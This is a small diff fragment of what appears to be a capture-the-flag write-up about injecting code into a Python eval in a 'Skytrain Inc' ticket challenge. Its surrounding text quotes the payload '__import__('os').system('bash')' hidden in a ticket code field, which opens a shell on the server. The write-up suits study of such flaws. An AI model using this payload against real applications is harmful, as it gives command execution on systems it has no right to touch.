@@ -165,9 +165,6 @@ The simplest way to inject into eval is to import the os modules and call system
 So the payload we get:
 ```
 # Skytrain Inc
-## Fuentes / Sources
-
-
 ## Ticket to Bridgeport
 __Ticket Code:__
 **32+110+43+__import__('os').system('bash')**
